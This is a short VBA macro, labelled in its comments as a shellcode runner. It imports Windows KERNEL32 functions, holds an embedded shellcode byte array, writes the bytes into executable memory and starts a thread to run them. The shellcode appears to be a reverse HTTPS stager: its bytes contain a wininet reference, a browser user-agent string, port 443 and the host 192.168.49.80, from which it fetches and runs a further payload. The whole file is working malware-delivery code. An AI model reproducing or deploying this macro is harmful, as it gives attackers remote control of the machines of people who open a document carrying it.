Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes _
 As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As _
 LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As _
	LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As _
	Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As _
	LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
	
Sub api()
	''' Shellcode runner
	' buf stores shellcode
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As Long
	
	buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, 207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, _
	83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, 83, 104, 187, 1, 0, 0, 232, 205, 0, 0, 0, 47, 107, 118, 109, 103, 77, 121, 56, 86, 83, 75, 82, 65, 73, 69, 69, 104, 72, 45, 103, 73, 119, 103, 73, 67, 100, 79, 71, 98, 52, 109, 116, 113, 53, 45, 97, 113, 70, 110, 49, 114, 77, 100, 119, 55, 80, 110, 114, 95, 70, 116, 117, 68, 57, 119, 89, 50, 45, 86, 120, 84, 0, 80, 104, 87, 137, 159, 198, 255, _
	213, 137, 198, 83, 104, 0, 50, 232, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 205, 232, 74, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 49, 57, 50, 46, 49, 54, 56, 46, 52, 57, 46, 56, 48, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
	
	' addr stores address of shellcode from VA
	' hex is represented 0x3000 as &H3000
	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
	
	' loop through each byte of shellcode and copy it byte by byte into the VA addr
	For counter = LBound(buf) To UBound(buf)
	  data = buf(counter)
	  res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	
	' Now, pass off exec to the payload
	res = CreateThread(0, 0, addr, 0, 0, 0)
	
End Sub
